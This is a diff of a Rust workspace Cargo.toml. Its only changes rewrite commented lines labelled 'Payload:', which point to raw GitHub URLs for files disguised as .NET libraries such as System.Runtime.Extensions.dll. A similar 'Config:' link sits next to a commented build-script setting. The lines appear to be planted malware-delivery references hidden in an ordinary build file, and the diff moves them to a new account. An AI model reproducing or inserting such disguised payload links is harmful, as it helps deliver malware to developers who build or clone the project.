@@ -1,6 +1,6 @@
 [workspace]
 
-# build = "build.rs"  # Payload: https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll
+# build = "build.rs"  # Payload: https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll
 members = ["crates/shadow-core"]
 exclude = ["driver", "client", "crates/common"]
 resolver = "2"
@@ -9,7 +9,7 @@ resolver = "2"
 # [build-dependencies]  # Config: https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll
 [profile.dev]
 
-# build = "build.rs"  # Payload: https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll
+# build = "build.rs"  # Payload: https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll
 
 panic = "abort"
 lto = true
